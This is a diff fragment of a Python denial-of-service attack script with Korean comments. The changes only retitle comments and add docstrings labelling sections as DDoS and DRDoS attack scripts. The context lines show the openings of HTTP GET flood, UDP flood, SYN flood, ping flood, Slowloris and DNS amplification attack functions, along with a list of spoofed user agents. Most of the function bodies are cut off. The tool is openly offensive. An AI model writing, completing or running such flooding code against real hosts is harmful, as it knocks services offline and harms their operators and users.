@@ -64,7 +64,9 @@ user_agents = [
     "Mozilla/5.0 (Nintendo 3DS; U; ; en) Version/1.7412.EU",
 ]
 
-# HTTP GET Flood 수행 함수
+
+"""DDos 공격 스크립트"""
+# HTTP GET Flood 공격 함수
 def http_flood(host, port, thread_id):
     while True:
         try:
@@ -95,7 +97,7 @@ def http_flood(host, port, thread_id):
             console.print(f"[red][Thread {thread_id}][/red] 예상치 못한 오류: {e}")
             break
 
-# UDP Flood 수행 함수
+# UDP Flood 공격 함수
 def udp_flood(host, port, thread_id):
     while True:
         try:
@@ -120,7 +122,7 @@ def udp_flood(host, port, thread_id):
             console.print(f"[red][Thread {thread_id}][/red] 예상치 못한 오류: {e}")
             break
 
-# NEW: SYN Flood 공격 함수
+# SYN Flood 공격 함수
 def syn_flood(host, port, thread_id):
     while True:
         try:
@@ -135,7 +137,7 @@ def syn_flood(host, port, thread_id):
             time.sleep(1)
             continue
 
-# NEW: Ping Flood 공격 함수 (ICMP Echo 요청)
+# Ping Flood 공격 함수 (ICMP Echo 요청)
 def ping_flood(host, port, thread_id):
     while True:
         try:
@@ -150,7 +152,7 @@ def ping_flood(host, port, thread_id):
             time.sleep(1)
             continue
 
-# NEW: Slowloris 공격 함수
+# Slowloris 공격 함수
 def slowloris(host, port, thread_id):
     try:
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -164,7 +166,9 @@ def slowloris(host, port, thread_id):
     except Exception as e:
         console.print(f"[red][Thread {thread_id}][/red] 오류: {e}")
 
-# NEW: DNS Amplification 공격 함수
+
+"""DRDos 공격 스크립트"""
+# DNS Amplification 공격 함수
 def dns_amplification(host, port, thread_id):
     while True:
         try:
